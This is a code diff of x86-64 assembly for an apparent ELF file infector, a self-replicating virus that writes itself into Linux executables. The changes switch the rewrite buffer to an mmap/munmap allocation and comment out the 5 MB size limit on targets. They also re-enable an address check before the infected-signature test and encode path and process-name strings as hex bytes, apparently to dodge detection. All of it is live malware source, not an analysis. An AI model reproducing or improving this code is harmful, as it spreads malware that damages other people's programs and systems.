@@ -354,10 +354,26 @@ fill_data_sec:
 rewrite_binary:
 	enter 0, 0
 	mov r11, rdi	;r11 contient elf_struc
+
+	mov rdi, 0
 	mov rsi, QWORD[r11 + elf_struc.stat + stat.st_size]
 	add rsi, QWORD[r11 + elf_struc.bits_added]
-	sub rsp, rsi	; nique sa mere mmap n'avait qu'a marcher
-	mov QWORD[r11 + elf_struc.new_bin_addr], rsp
+	mov rdx, MMAP_PROT
+	mov r10, MAP_ANONYMOUS | MAP_PRIVATE
+	mov r9, r8
+	inc r9
+	sub r8, r9
+	mov r9, r8
+	inc r9
+	sub rax, rax
+	xor rax, sys_mmap
+	push r11
+	syscall
+	padding
+	pop r11
+	cmp rax, 0
+	jl ret_0
+	mov QWORD[r11 + elf_struc.new_bin_addr], rax
 
 	mov rbx, QWORD[r11 + elf_struc.bits_added]
 	mov rax, QWORD[r11 + elf_struc.ehdr]
@@ -439,6 +455,17 @@ rewrite_binary:
 	padding
 	pop r11
 
+	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
+	xor rsi, rsi
+	sub rsi, QWORD[r11 + elf_struc.stat + stat.st_size]
+	neg rsi
+	add rsi, QWORD[r11 + elf_struc.bits_added]
+	mov rax, sys_munmap
+	push r11
+	syscall
+	padding
+	pop r11
+
 	mov rdi, QWORD[r11 + elf_struc.fd2]
 	mov rax, sys_close
 	syscall
@@ -493,7 +520,7 @@ infect_elf:		; r8:elf_struc
 	mov rdi, QWORD[r8 + elf_struc.bits_added]
 	add rdi, QWORD[r8 + elf_struc.stat + stat.st_size]
 	cmp rdi, 5000000
-	jg infect_elf_end
+	;jg infect_elf_end
 
 	mov rdi, QWORD[r8 + elf_struc.data_phdr]
 	mov rsi, QWORD[rdi + phdr.p_offset]
@@ -502,11 +529,15 @@ infect_elf:		; r8:elf_struc
 	add rdi, rsi
 	mov rsi, end - signature
 	sub rdi, rsi
-	;push rdi
-	;call check_addr
-	;cmp rax, 0
-	;je infect_elf_end
-	;pop rdi
+
+	push rdi
+	mov rsi, rdi
+	mov rdi, r8
+	call check_addr
+	cmp rax, 0
+	je infect_elf_end
+	pop rdi
+
 	lea rsi, [rel signature]
 	call strcmp							;test if infected
 	cmp rax, 0
@@ -809,9 +840,9 @@ dir2:
 proc_dir:
 	db '/proc/', 0
 proc_name_file:
-	db '/comm', 0
+	db 0x2f, 0x63, 0x6f, 0x6d, 0x6d, 0
 proc_ban:
-	db 'test', 0xa, 0
+	db 0x74, 0x65, 0x73, 0x74, 0x0a, 0
 new_line:
 	db 0x0a, 0
 dot:
